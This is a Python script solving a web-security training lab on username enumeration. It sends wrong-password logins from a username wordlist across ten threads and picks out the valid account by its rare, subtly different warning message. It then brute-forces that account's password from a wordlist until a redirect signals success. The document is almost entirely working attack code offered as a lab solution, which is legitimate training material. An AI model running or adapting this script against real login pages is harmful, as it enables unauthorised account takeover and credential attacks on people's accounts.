# Lab: Username enumeration via subtly different responses (intended solution)

import requests
import re
from pathlib import Path
from collections import Counter
from concurrent.futures import ThreadPoolExecutor

base = "https://0ad100fb04782fbf829b701d00c900b5.web-security-academy.net"

print("===========[step1] prep files for bruteforce===============")
cwd = Path(__file__).resolve().parent
with open(cwd / "username.txt", "r", encoding="utf-8") as usernamefile:
    username_list = usernamefile.read().splitlines()
with open(cwd / "password.txt", "r", encoding="utf-8") as passfile:
    pass_list = passfile.read().splitlines()

def get_warning(username):
    # send wrong password on purpose, only care about the warning text
    r = requests.post(f"{base}/login",
                      data={"username": username, "password": "wrongpass"},
                      allow_redirects=False)
    m = re.search(r"<p class=is-warning>(.*?)</p>", r.text)
    warning = m.group(1) if m else ""
    return username, warning

print("===========[step2] Enumerate valid username===============")
with ThreadPoolExecutor(max_workers=10) as pool:
    results = list(pool.map(get_warning, username_list))

# count how many times each warning appears
counter = Counter(warning for _, warning in results)
for warning, count in counter.items():
    print(f"{count:3d}x {warning!r}")   # !r shows hidden spaces / dots

rare_warning = min(counter, key=counter.get)   # the one that appears least
valid_username = [u for u, w in results if w == rare_warning][0]
print(f"[+] Valid username: {valid_username}")

def try_login(password):
    r = requests.post(f"{base}/login",
                      data={"username": valid_username, "password": password},
                      allow_redirects=False)
    return password, r.status_code

print("===========[step3] Bruteforce password===============")
with ThreadPoolExecutor(max_workers=10) as pool:
    for password, status in pool.map(try_login, pass_list):
        if status == 302:
            print(f"[+] Found: {valid_username} / {password}")
            break